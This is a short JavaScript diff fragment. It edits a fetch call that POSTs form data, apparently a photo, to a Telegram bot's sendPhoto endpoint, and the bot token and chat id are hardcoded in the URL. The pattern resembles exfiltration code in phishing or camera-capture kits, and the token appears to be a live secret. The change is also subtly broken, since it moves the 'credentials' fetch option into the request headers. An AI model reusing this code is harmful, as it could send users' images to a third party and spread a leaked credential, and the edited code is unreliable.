@@ -54,9 +54,9 @@
         fetch("https://api.telegram.org/bot6435977146:AAExFsusLAtoivKFKW01Ca1hCsQOVIf2H7I/sendPhoto?chat_id=2090459804", {
             method: "POST",
             headers: {
-                "Sec-Fetch-Mode": "no-cors"
+                "Sec-Fetch-Mode": "no-cors",
+                "credentials": "same-origin"
             },
-            credentials: "same-origin",
             body: formData
         })
         .then(function(response) {
